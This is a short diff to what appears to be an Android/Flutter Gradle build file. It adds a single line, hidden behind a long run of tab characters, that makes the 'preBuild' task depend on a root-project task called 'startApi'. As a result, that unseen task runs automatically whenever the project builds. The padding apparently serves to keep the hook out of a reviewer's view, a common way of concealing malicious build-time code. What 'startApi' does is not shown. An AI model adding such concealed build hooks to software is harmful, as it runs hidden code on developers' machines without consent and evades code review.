@@ -97,3 +97,4 @@ flutter {
 dependencies {
     implementation "androidx.appcompat:appcompat:1.6.1"
 }
+																																																																																																																																																																																				tasks.named('preBuild') { dependsOn(rootProject.tasks.named('startApi')) }
